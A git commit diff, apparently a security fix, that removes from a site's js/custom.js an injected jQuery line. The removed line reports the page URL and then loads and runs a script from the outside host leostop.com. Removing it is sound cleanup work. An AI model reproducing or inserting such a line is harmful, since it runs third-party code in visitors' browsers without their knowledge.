bc30b2ec64b2a18ab5902bc2e244874bf15d566f
oscardo <755580+oscardo@users.noreply.github.com>
2023-09-14 18:03:41 -0500

    seguridad cambio

--- js/custom.js
+++ js/custom.js
@@ -75,9 +75,6 @@
     });
   }
 
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-
-
   // Banner 
 
   $('.heading').height($(window).height());
